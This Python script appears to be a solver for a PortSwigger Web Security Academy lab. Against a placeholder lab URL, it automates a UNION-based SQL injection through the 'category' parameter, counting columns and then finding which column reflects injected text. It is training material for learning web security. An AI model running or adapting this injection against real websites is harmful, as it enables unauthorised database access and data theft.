#!/usr/bin/env python3
import requests
from requests_html import HTMLSession
from dataclasses import dataclass, field
import sys


# Disable warnings generated due to unverified SSL connections
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

"""
Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided.
"""


def validate(response):
    """
    Validate Response Objects

    :param response: The Response object, which contains a server’s response to an HTTP request.
    :return:
    """
    try:
        response.raise_for_status()
    except requests.exceptions.HTTPError:
        if response.status_code == 404:
            help_msg = 'The session you are looking for has expired.'
            sys.exit(f'{response.status_code}: {response.reason}. {help_msg}')
    except requests.exceptions.ConnectionError as error:
        help_msg = 'Please make sure you are using a valid URL.'
        sys.exit(f'{help_msg}\n{error}')
    except requests.exceptions.Timeout:
        help_msg = 'Request timed out. This may be due to using an outdated lab URL.'
        sys.exit(f'{help_msg}')
    except requests.exceptions.RequestException as error:
        help_msg = 'Caught general exception:'
        sys.exit(f'{help_msg} {error}')


@dataclass()
class Injection:
    lab_url: str = field()
    parameters: dict = field(default_factory=dict)
    session: requests.Session = field(default=requests.Session())
    null: list = field(default_factory=list)

    def __post_init__(self):
        self.lab_url = f'{self.lab_url}filter' if self.lab_url.endswith('/') else f'{self.lab_url}/filter'
        self.null = ["'UNION SELECT", 'NULL', '--']
        self.parameters['category'] = f"Lifestyle{' '.join(self.null)}"

    def null_logic(self):
        response = self.session.get(url=self.lab_url, params=self.parameters, timeout=5)
        validate(response=response)

        while not response.ok:
            # Remove '--' then add ', NULL --' until response.ok is True
            self.null.remove('--')
            self.null.extend([',', 'NULL', '--'])
            self.parameters['category'] = f"Lifestyle{' '.join(self.null)}"
            response = self.session.get(url=self.lab_url, params=self.parameters)

        print(f"There are {self.null.count('NULL')} columns.")

    def secret_logic(self):
        # Perform a new request
        self.session = HTMLSession()
        response = self.session.get(url=self.lab_url, params=self.parameters)

        try:
            secret = response.html.search("Make the database retrieve the string: '{}'")[0]
            # The quotation marks need to be inserted into the query also
            secret = f"'{secret}'"
        except TypeError:
            # If secret could not be found, it must be because the lab has already been completed
            sys.exit(response.html.find('#notification-labsolved > div > h4', first=True).text)

        # Initialize column variable for accurate column count
        column = 1

        # Find all indexes where the value is NULL
        only_null = (index for index, value in enumerate(self.null) if value == 'NULL')

        for index in only_null:
            self.null[index] = secret
            self.parameters['category'] = f"Lifestyle{' '.join(self.null)}"
            response = self.session.get(url=self.lab_url, params=self.parameters)

            if response.html.find('#notification-labsolved'):
                break
            else:
                self.null[index] = "NULL"
                column += 1
                continue

        print(f'Column {column} contains inserted text')

        # Return the index where the secret value appeared within the query results
        return self.null.index(secret)


if __name__ == '__main__':
    lab_url = 'https://abcd.web-security-academy.net/'

    sqli = Injection(lab_url=lab_url)
    sqli.null_logic()
    sqli.secret_logic()
